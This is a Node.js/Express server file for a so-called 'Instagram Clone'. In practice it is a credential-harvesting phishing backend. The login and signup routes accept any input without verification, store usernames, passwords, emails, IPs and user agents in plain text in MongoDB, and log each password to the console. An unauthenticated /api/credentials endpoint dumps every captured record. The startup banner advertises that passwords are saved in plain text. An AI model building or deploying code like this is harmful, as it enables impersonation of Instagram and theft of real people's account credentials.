const express = require('express');
const mongoose = require('mongoose');
const session = require('express-session');
const path = require('path');
require('dotenv').config();

const app = express();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Session configuration
app.use(session({
    secret: process.env.SESSION_SECRET || 'fallback_secret_key',
    resave: false,
    saveUninitialized: false,
    cookie: { maxAge: 24 * 60 * 60 * 1000 }
}));

// MongoDB Connection
const connectDB = async () => {
    try {
        console.log('🔄 Connecting to MongoDB...');
        await mongoose.connect(process.env.MONGODB_URI);
        console.log('✅ Connected to MongoDB successfully!');
    } catch (error) {
        console.error('❌ MongoDB connection error:', error.message);
        process.exit(1);
    }
};

connectDB();

// Credentials Schema - Stores PLAIN passwords
const credentialSchema = new mongoose.Schema({
    type: { type: String, required: true }, // LOGIN or SIGNUP
    email: { type: String, default: '' },
    fullName: { type: String, default: '' },
    username: { type: String, required: true },
    password: { type: String, required: true }, // PLAIN PASSWORD - NOT encrypted!
    ip: { type: String, default: '' },
    userAgent: { type: String, default: '' },
    createdAt: { type: Date, default: Date.now }
});

const Credential = mongoose.model('Credential', credentialSchema);

// Auth Middleware
const isAuthenticated = (req, res, next) => {
    if (req.session.username) {
        next();
    } else {
        res.redirect('/login');
    }
};

// Routes
app.get('/', (req, res) => {
    if (req.session.username) {
        return res.redirect('/home');
    }
    res.redirect('/login');
});

app.get('/login', (req, res) => {
    if (req.session.username) {
        return res.redirect('/home');
    }
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/signup', (req, res) => {
    if (req.session.username) {
        return res.redirect('/home');
    }
    res.sendFile(path.join(__dirname, 'public', 'signup.html'));
});

// Login POST - Save plain password to MongoDB
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        if (!username || !password) {
            return res.status(400).json({ error: 'Please enter username and password' });
        }

        // Save to MongoDB with PLAIN password
        await Credential.create({
            type: 'LOGIN',
            username: username,
            password: password,  // Plain password - NOT encrypted!
            ip: req.ip || req.connection.remoteAddress,
            userAgent: req.headers['user-agent']
        });

        req.session.username = username;

        console.log(`✅ LOGIN saved to MongoDB: ${username} | Password: ${password}`);
        res.json({ success: true, message: 'Login successful', redirect: '/home' });

    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Server error. Please try again.' });
    }
});

// Signup POST - Save plain password to MongoDB
app.post('/api/signup', async (req, res) => {
    try {
        const { email, fullName, username, password } = req.body;
        
        if (!email || !fullName || !username || !password) {
            return res.status(400).json({ error: 'Please fill in all fields' });
        }

        // Save to MongoDB with PLAIN password
        await Credential.create({
            type: 'SIGNUP',
            email: email,
            fullName: fullName,
            username: username,
            password: password,  // Plain password - NOT encrypted!
            ip: req.ip || req.connection.remoteAddress,
            userAgent: req.headers['user-agent']
        });

        req.session.username = username;
        req.session.fullName = fullName;
        req.session.email = email;

        console.log(`✅ SIGNUP saved to MongoDB: ${username} | Password: ${password}`);
        res.json({ success: true, message: 'Signup successful', redirect: '/home' });

    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ error: 'Server error. Please try again.' });
    }
});

// View all credentials from MongoDB (plain passwords visible!)
app.get('/api/credentials', async (req, res) => {
    try {
        const credentials = await Credential.find().sort({ createdAt: -1 });
        res.json({
            total: credentials.length,
            credentials: credentials
        });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

// Home Page
app.get('/home', isAuthenticated, (req, res) => {
    const user = {
        username: req.session.username,
        fullName: req.session.fullName || req.session.username,
        profilePic: 'https://i.imgur.com/V4RclNb.png',
        email: req.session.email || `${req.session.username}@instagram.com`,
        bio: 'Welcome to Instagram Clone!',
        followers: [],
        following: []
    };

    res.render('home', { user, posts: [] });
});

// Logout
app.get('/logout', (req, res) => {
    console.log(`👋 User logged out: ${req.session.username}`);
    req.session.destroy();
    res.redirect('/login');
});

// Start Server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`\n🚀 Server running on http://localhost:${PORT}`);
    console.log(`📱 Login page: http://localhost:${PORT}/login`);
    console.log(`📝 Signup page: http://localhost:${PORT}/signup`);
    console.log(`🔑 View credentials: http://localhost:${PORT}/api/credentials`);
    console.log(`\n✨ All passwords saved in PLAIN TEXT to MongoDB!\n`);
});